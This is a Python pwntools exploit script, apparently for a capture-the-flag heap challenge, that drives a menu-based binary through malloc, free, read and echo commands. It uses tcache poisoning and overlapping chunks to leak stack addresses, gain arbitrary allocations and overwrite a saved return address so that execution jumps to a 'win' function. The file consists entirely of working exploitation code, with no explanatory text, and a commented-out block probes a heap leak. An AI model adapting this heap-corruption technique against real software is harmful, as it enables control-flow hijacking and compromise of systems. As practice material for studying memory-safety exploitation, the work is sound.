#!/bin/python 

from pwn import *
import sys

context.arch = 'amd64'
#context.log_level = 'debug'

BUFFER_OFF = 0x16
GOAL = "win"

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"scanf")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"puts")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def echo(idx, offset):
    proc.clean()
    proc.sendline(b"echo")
    proc.sendline(str(idx))
    proc.sendline(str(offset))

    proc.recvuntil(b"Data: ")
    return proc.recvline(drop=True)


def read(idx, size, contents: bytes):
    proc.sendline(b"read")
    proc.sendline(str(idx))
    proc.sendline(str(size))
    proc.sendline(contents)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def overwrite_next(bin, contents: bytes):
    tcache_get_two_entries(bin)
    scanf(14, contents)


def get_custom_ptr(size, contents: bytes):
    tcache_size = (size & 0xFFFFFFF0) + 16
    for i in range(3):
        malloc(i, size)
    for i in range(2, -1, -1):
        free(i)

    malloc(0, size)
    read(0, tcache_size+8, b'X' * size + p64(0) + p64(tcache_size+1) + contents)
    malloc(0, size)
    malloc(0, size)

    return echo(0, 0)
    

def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


if len(sys.argv) > 2:
    proc = gdb.debug(sys.argv[1], gdbscript='''
                        pwndbg-init
                        set follow-fork-mode parent
                        nextret
                    ''')
else:
    proc = process(sys.argv[1])

elf = proc.elf


size = 0x20
tcache_size = (size & 0xFFFFFFF0) + 16

tcache_get_two_entries(size)
malloc(0, size)
stack_leak = get_addr_num(echo(0, tcache_size + 8))
print("[$] stack leak: " + hex(stack_leak))

saved_rip = get_addr_num(get_custom_ptr(size, p64(stack_leak+BUFFER_OFF))) - 0x1000
print("[$] saved return address: " + hex(saved_rip))

main_rip_loc = stack_leak + BUFFER_OFF + 0x150 + 0x10
saved_main_rip = get_addr_num(get_custom_ptr(size, p64(main_rip_loc)))
print("[$] ret2libc: " + hex(saved_main_rip))

read(0, 8, p64((saved_rip & 0xFFFFFFFFF000) + (elf.symbols['win'] & 0x0FFF)))
proc.sendline(b'quit')

'''
tcache_get_two_entries(size)
malloc(0, size)
heap_leak = get_addr_num(echo(0,0))
print("[$] heap leak: " + hex(heap_leak))

tcache_get_two_entries(size)
malloc(0, size)
read(0, size + 16, b'A' * size + b'X' * 8 + b'Y' * 8)
'''

proc.interactive()
